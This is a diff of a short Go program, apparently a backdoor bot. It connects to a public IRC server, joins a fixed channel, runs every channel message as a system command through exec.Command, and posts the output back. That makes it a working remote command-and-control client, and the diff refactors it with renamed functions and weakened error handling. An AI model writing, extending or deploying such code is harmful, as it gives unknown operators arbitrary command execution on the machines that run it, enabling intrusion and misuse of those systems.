@@ -1,20 +1,15 @@
 package main
 
 import (
-	"log"
 	"net"
-	"fmt"
+	"fmt" // debug
 	"os/exec"
-	// "io/ioutil"
 	"strings"
 
 	irc "gopkg.in/irc.v3"
-	// uuid "github.com/segmentio/ksuid"
 )
 
 func main() {
-	// nodeName := uuid.New().String()
-	
 	config := irc.ClientConfig{
 		Nick: "Z",
 		Pass: "password",
@@ -24,43 +19,37 @@ func main() {
 			if m.Command == "001" {
 				c.Write("JOIN #yyyzzzxxx")
 			} else if m.Command == "PRIVMSG" && c.FromChannel(m) {
-				fmt.Println(m.Params[1]) // debug
-
 				c.WriteMessage(&irc.Message{
 					Command: "PRIVMSG",
 					Params: []string{
 						m.Params[0], // channel/user name
-						cmdExecutor(m.Params[1]),
+						executeCommand(m.Params[1]),
 					},
 				})
 			}
 		}),
 	}
 
-	go connectToServer("chat.freenode.net:6667", config)
+	go connect("chat.freenode.net:6667", config)
 
 	// hax
 	fmt.Println("Whoa!"); select{}
 }
 
-func cmdExecutor(input string) string {
+func executeCommand(input string) string {
 	cmd, params := splitParams(input)
 	out, _ := exec.Command(cmd, params...).Output()
+
+	fmt.Printf("debug executing: %v, %v\n", cmd, params)
 
 	return strings.ReplaceAll(string(out), "\n", " \\n ")
 }
 
-func connectToServer(ircServer string, clientConfig irc.ClientConfig) {
-	conn, err := net.Dial("tcp", ircServer)
-	if err != nil {
-		log.Fatalln(err)
-	}
+func connect(srv string, cfg irc.ClientConfig) {
+	conn, _ := net.Dial("tcp", srv) // retry here
 
-	client := irc.NewClient(conn, clientConfig)
-	err = client.Run()
-	if err != nil {
-		log.Fatalln(err)
-	}
+	client := irc.NewClient(conn, cfg)
+	_ = client.Run()
 }
 
 func splitParams(line string) (string, []string) {
